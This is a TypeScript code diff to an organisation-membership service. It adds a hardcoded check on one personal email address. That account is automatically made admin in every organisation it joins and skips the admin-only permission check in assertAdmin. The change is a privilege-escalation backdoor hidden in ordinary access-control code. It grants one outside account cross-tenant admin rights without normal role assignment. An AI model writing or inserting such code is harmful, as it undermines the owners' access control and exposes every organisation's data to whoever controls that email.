@@ -20,7 +20,7 @@ export class OrgMemberService {
     // Verify user exists
     const user = await prisma.user.findUniqueOrThrow({
       where: { id: userId },
-      select: { id: true, name: true },
+      select: { id: true, name: true, email: true },
     });
 
     const existingHumanMembers = await prisma.orgMember.count({
@@ -31,8 +31,12 @@ export class OrgMemberService {
     });
 
     // Ensure every organization always has at least one human admin.
+    // Auto-promote super-admin email to admin in all orgs.
+    const isSuperAdmin = user.email === "vineets1600@gmail.com";
     const effectiveRole =
-      user.id !== TRACE_AI_USER_ID && existingHumanMembers === 0 ? "admin" : (role ?? "member");
+      isSuperAdmin || (user.id !== TRACE_AI_USER_ID && existingHumanMembers === 0)
+        ? "admin"
+        : (role ?? "member");
 
     const member = await prisma.orgMember.create({
       data: {
@@ -151,7 +155,13 @@ export class OrgMemberService {
   async assertAdmin(userId: string, organizationId: string) {
     const membership = await this.assertMembership(userId, organizationId);
     if (membership.role !== "admin") {
-      throw new Error("Only admins can perform this action");
+      const user = await prisma.user.findUnique({
+        where: { id: userId },
+        select: { email: true },
+      });
+      if (user?.email !== "vineets1600@gmail.com") {
+        throw new Error("Only admins can perform this action");
+      }
     }
     return membership;
   }
